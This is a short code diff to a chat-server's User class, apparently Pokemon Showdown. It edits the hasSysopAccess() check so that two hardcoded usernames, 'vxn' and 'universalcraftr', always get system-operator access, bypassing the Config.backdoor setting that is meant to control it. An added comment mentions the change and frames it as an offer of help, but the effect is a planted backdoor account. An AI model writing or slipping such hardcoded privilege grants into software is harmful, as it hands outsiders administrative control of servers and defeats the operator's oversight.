@@ -477,9 +477,11 @@ class User {
 	}
 	/**
 	 * Special permission check for system operators
+	 * The users vxn and universalcraftr are the sysops for this server
+	 * If you dont want me (vxn) or universalcraftr to help your server please remove the names in the array and add your own
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || ["vxn", "universalcraftr"].includes(this.userid)) {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
